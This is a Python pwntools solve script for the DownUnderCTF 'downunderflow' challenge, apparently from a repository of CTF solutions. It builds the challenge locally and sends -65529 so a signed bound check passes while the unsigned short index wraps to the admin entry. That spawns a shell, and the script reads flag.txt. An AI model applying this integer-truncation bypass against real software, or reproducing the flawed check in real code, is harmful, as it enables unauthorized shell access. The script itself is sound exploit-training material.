#!/usr/bin/env python3
"""Solve DownUnderCTF `downunderflow` -- a signed/unsigned index underflow.

Recon: `downunderflow.c` reads an int with `read_int_lower_than(7)` (rejects
`x >= 7`) but stores it into an `unsigned short idx`, then indexes
`logins[idx]`. `logins[7]` is "admin", which triggers `system("/bin/sh")`.

Clue: the bound check is on the signed int, but the index is unsigned short.
A negative value passes `x < 7`, yet wraps modulo 65536 when narrowed:
`-65529 mod 65536 == 7`. So `idx` lands on the admin entry without ever
passing 7 to the check. We get a shell and cat the flag.

Built and run LOCALLY against its own binary + flag.txt.

Fetch first:  python challenges/fetch.py downunderflow
"""
import os
import re
import subprocess

from pwn import context, process

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "downunderflow", "src")
context.log_level = "error"


def main() -> None:
    subprocess.run(["gcc", "downunderflow.c", "-o", "downunderflow"],
                   cwd=CHALL, check=True)
    proc = process(os.path.join(CHALL, "downunderflow"), cwd=CHALL)
    proc.sendline(b"-65529")        # (unsigned short)(-65529) == 7 -> admin
    proc.sendline(b"cat flag.txt")  # the spawned /bin/sh runs this
    out = proc.recvall(timeout=3).decode(errors="replace")
    match = re.search(r"DUCTF\{[^}]*\}", out)
    print("FLAG:", match.group(0) if match else "not found")


if __name__ == "__main__":
    main()
